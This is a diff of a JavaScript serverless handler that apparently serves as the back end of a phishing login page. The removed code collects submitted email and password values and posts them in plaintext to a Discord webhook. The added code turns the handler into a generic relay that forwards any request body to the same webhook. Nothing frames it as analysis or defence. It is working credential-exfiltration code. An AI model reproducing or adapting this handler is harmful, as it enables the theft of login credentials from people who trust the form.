@@ -29,14 +29,11 @@ export default async function handler(req, res) {
   }
 
   try {
-    const { email, password, remember } = req.body || {};
+    const body = req.body || {};
 
-    const safeEmail = String(email || '').trim();
-    const safePassword = String(password || '').trim();
-    const safeRemember = remember ? 'Yes' : 'No';
-
-    if (!safeEmail || !safePassword) {
-      return res.status(400).json({ error: 'Missing required fields' });
+    // Basic validation: must have something Discord accepts
+    if (!body.content && !body.embeds) {
+      return res.status(400).json({ error: 'Invalid payload format' });
     }
 
     const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
@@ -44,33 +41,24 @@ export default async function handler(req, res) {
       return res.status(500).json({ error: 'Server misconfigured' });
     }
 
-    const payload = {
-      content: '**New Form Submission**',
-      embeds: [
-        {
-          title: 'New Form Submission',
-          fields: [
-            { name: 'email', value: safeEmail, inline: true },
-            { name: 'password', value: safePassword, inline: true },
-            { name: 'Remember Me', value: safeRemember, inline: true }
-          ],
-          timestamp: new Date().toISOString()
-        }
-      ]
-    };
-
     const discordResponse = await fetch(webhookUrl, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(payload)
+      body: JSON.stringify(body)
     });
 
     if (!discordResponse.ok) {
-      return res.status(502).json({ error: 'Discord webhook failed' });
+      const text = await discordResponse.text();
+      return res.status(502).json({
+        error: 'Discord webhook failed',
+        details: text
+      });
     }
 
     return res.status(200).json({ success: true });
-  } catch {
+
+  } catch (err) {
+    console.error(err);
     return res.status(500).json({ error: 'Internal server error' });
   }
 }
